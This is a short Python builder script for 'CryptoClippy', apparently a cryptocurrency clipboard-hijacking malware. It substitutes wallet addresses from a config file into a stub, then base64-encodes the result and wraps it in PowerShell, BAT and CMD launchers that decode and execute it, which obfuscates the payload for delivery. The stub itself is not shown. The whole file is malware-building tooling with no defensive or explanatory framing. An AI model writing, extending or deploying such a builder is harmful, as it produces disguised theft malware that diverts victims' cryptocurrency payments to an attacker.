from src import *
shutil.rmtree('temp', ignore_errors=True)
os.mkdir('temp')

with open('src\\stub.py', 'r', encoding='utf-8') as f:
    stub = f.read()

with open('config.json', 'r', encoding='utf-8') as f:
    config = dict(json.load(f))

for coin, address in config.items():
    stub = re.sub(rf'\|{coin}\|?', f'{address}', stub)

with open('temp\\CryptoClippy.py', 'w', encoding='utf-8') as f:
    f.write(stub)

encoded = base64.b64encode(stub.encode('utf-8')).decode('ascii')

#PS1
content = f'python -c "import base64; exec(base64.b64decode(\'{encoded}\').decode(\'utf-8\'))"'
with open('temp\\CryptoClippy.ps1', 'w', encoding='utf-8') as f:
    f.write(content)

#BAT/CMD
content = f'@echo off\npython -c "import base64; exec(base64.b64decode(\'{encoded}\').decode(\'utf-8\'))"'

for ext in ['.bat', '.cmd']:
    with open(f'temp\\CryptoClippy{ext}', 'w', encoding='utf-8') as f:
        f.write(content)

subprocess.run(['explorer', os.path.abspath('temp')])